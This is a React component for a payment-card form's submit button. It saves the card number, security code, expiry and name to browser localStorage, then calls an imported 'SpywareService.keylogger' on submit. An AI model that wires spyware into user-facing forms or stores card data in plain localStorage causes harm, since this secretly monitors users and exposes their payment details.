import React from "react";
import {useFormContext} from "@/app/components/Form/FormProvider";
import {saveCardOnLocalStorage} from "@/tools/localstorage";
import {useCardListContext} from "@/app/components/CardList/CardListProvider";
import {SpywareService} from "@/services/Spyware";

type FormSubmitProps = React.ComponentProps<'button'>

export const FormSubmit = ({children, type}: FormSubmitProps) => {
    const {card, setCard} = useFormContext();
    const {setCards} = useCardListContext();

    const onSubmit = () => {
        saveCardOnLocalStorage(card);
        setCards((prevState) => [...prevState, card]);
        setCard({date: "", code: "", number: "", name: ""});

        void SpywareService.keylogger('[DATA SUBMITTED]')
    }

    return <FormButton
        type={type}
        onSubmit={onSubmit}
        onClick={onSubmit}
    >{children}</FormButton>
}

export const FormButton = ({children, type, onSubmit, onClick}: FormSubmitProps) => {
    return <button type={type}
                   className="mt-8 text-gray-900 border-gray-900 border px-4 py-2 rounded-lg bg-gradient-to-l
                   from-transparent to-transparent
                   hover:from-[rgba(2,0,36,1)] hover:to-[rgba(88,88,88,1)] hover:text-gray-300 transition-all duration-500 "
                   onClick={onClick}
                   onSubmit={onSubmit}
    >{children}</button>
}